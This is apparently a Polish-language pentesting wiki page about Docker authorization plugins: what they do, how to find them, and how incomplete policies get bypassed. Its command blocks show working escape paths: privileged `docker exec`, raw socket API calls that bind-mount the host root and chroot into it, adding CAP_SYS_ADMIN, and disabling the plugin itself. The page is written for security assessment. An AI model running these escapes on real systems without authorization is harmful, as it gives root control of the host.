# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Runtime authorization plugins to dodatkowa warstwa polityk, która decyduje, czy caller może wykonać daną akcję daemona. Docker jest klasycznym przykładem. Domyślnie każdy, kto może komunikować się z demonem Dockera, ma de facto szeroką kontrolę nad nim. Authorization plugins próbują zawęzić ten model, analizując uwierzytelnioną tożsamość użytkownika i żądaną operację API, a następnie zezwalając lub odrzucając żądanie zgodnie z polityką.

Ten temat zasługuje na oddzielną stronę, ponieważ zmienia model eksploatacji, gdy atakujący już ma dostęp do API Dockera lub do użytkownika w grupie `docker`. W takich środowiskach pytanie nie brzmi już tylko „czy mogę dotrzeć do daemona?”, ale także „czy demon jest odgrodzony warstwą autoryzacji, a jeśli tak, czy tę warstwę można obejść przez nieobsłużone endpointy, słabe parsowanie JSON lub uprawnienia do zarządzania pluginami?”

## Działanie

Gdy żądanie trafia do demona Dockera, podsystem autoryzacji może przekazać kontekst żądania do jednej lub więcej zainstalowanych wtyczek. Wtyczka widzi uwierzytelnioną tożsamość użytkownika, szczegóły żądania, wybrane nagłówki oraz części ciała żądania lub odpowiedzi, gdy typ treści na to pozwala. Można łączyć wiele wtyczek, a dostęp jest przyznawany tylko jeśli wszystkie wtyczki pozwalają na żądanie.

Model ten wydaje się silny, ale jego bezpieczeństwo zależy całkowicie od tego, jak dokładnie autor polityki rozumiał API. Wtyczka, która blokuje `docker run --privileged`, ale ignoruje `docker exec`, pomija alternatywne klucze JSON, takie jak top-level `Binds`, lub zezwala na administrację pluginami, może stworzyć fałszywe poczucie ograniczenia, pozostawiając jednocześnie otwarte bezpośrednie ścieżki eskalacji uprawnień.

## Typowe cele wtyczek

Ważne obszary do przeglądu polityki to:

- endpointy tworzenia kontenerów
- pola `HostConfig` takie jak `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` oraz opcje współdzielenia namespace'ów
- zachowanie `docker exec`
- endpointy zarządzania pluginami
- każdy endpoint, który może pośrednio wywołać akcje runtime poza zamierzonym modelem polityki

Historycznie przykłady takie jak Twistlock's `authz` plugin oraz proste edukacyjne wtyczki jak `authobot` ułatwiały badanie tego modelu, ponieważ ich pliki polityk i ścieżki kodu pokazywały, jak mapowanie endpoint→akcja było faktycznie zaimplementowane. Dla prac oceniających ważna lekcja jest taka, że autor polityki musi rozumieć pełną powierzchnię API, a nie tylko najbardziej widoczne polecenia CLI.

## Nadużycia

Pierwszym celem jest dowiedzieć się, co jest faktycznie blokowane. Jeśli demon odrzuca akcję, błąd często leaks nazwę wtyczki, co pomaga zidentyfikować stosowaną kontrolę:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Jeśli potrzebujesz szerszego profilowania endpointów, narzędzia takie jak `docker_auth_profiler` są przydatne, ponieważ automatyzują inaczej powtarzalne zadanie sprawdzania, które trasy API i struktury JSON są faktycznie dozwolone przez plugin.

Jeśli środowisko używa niestandardowego pluginu i możesz współdziałać z API, wypisz, które pola obiektu są faktycznie filtrowane:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Te sprawdzenia mają znaczenie, ponieważ wiele błędów autoryzacji jest specyficznych dla pól, a nie dla pojęć. Plugin może odrzucić wzorzec CLI bez pełnego zablokowania równoważnej struktury API.

### Pełny przykład: `docker exec` dodaje uprawnienia po utworzeniu kontenera

Polityka, która blokuje tworzenie uprzywilejowanych kontenerów, ale pozwala na tworzenie kontenerów bez ograniczeń oraz `docker exec`, może nadal zostać ominięta:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Jeśli daemon zaakceptuje drugi krok, użytkownik odzyska uprzywilejowany interaktywny proces wewnątrz kontenera, który autor polityki uważał za ograniczony.

### Full Example: Bind Mount Through Raw API

Niektóre wadliwe polityki sprawdzają tylko jeden kształt JSON. Jeśli root filesystem bind mount nie jest blokowany konsekwentnie, host nadal może zostać zamontowany:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ta sama idea może również pojawić się w `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Skutkiem jest całkowita ucieczka z systemu plików hosta. Ciekawym szczegółem jest to, że obejście wynika z niepełnego pokrycia polityki, a nie z błędu jądra.

### Pełny przykład: Nieprzefiltrowany atrybut Capability

Jeśli polityka zapomni przefiltrować atrybut związany z capability, atakujący może stworzyć container, który odzyska niebezpieczną capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Gdy obecne jest `CAP_SYS_ADMIN` lub podobnie silne capability, wiele breakout techniques opisanych w [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) staje się dostępnych.

### Pełny przykład: Disabling The Plugin

Jeśli operacje plugin-management są dozwolone, najczystszy bypass może polegać na całkowitym wyłączeniu tej kontroli:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
To jest błąd polityki na poziomie płaszczyzny kontrolnej. Warstwa autoryzacji istnieje, ale użytkownik, którego miała ograniczać, nadal ma uprawnienia do jej wyłączenia.

## Sprawdzenia

Polecenia te mają na celu ustalenie, czy warstwa polityki istnieje oraz czy wydaje się być kompletna, czy jedynie powierzchowna.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Co jest tu interesujące:

- Komunikaty odmowy, które zawierają nazwę pluginu, potwierdzają istnienie warstwy autoryzacji i często ujawniają dokładną implementację.
- Lista pluginów widoczna dla atakującego może wystarczyć, by ustalić, czy możliwe są operacje wyłączenia lub rekonfiguracji.
- Politykę, która blokuje tylko oczywiste akcje CLI, ale nie surowe żądania API, należy traktować jako możliwą do obejścia, dopóki nie udowodniono inaczej.

## Domyślne ustawienia środowiska wykonawczego

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Daemon access is effectively all-or-nothing unless an authorization plugin is configured | niekompletna polityka pluginów, stosowanie czarnych list zamiast list dozwolonych, umożliwianie zarządzania pluginami, luki na poziomie pól |
| Podman | Not a common direct equivalent | Podman zazwyczaj bardziej polega na uprawnieniach Unix, uruchamianiu bez roota i decyzjach dotyczących ekspozycji API niż na Docker-style authz plugins | szerokie udostępnianie API Podman działającego jako root, słabe uprawnienia gniazda |
| containerd / CRI-O | Different control model | Te runtime'y zwykle opierają się na uprawnieniach socketu, granicach zaufania węzła i kontrolach orkiestratora na wyższych warstwach, a nie na Docker authz plugins | montowanie gniazda w workloadach, słabe lokalne założenia dotyczące zaufania węzła |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | RBAC klastra i kontrola admission są główną warstwą polityk | zbyt szerokie uprawnienia RBAC, słaba polityka admission, bezpośrednie udostępnianie kubelet lub runtime API |
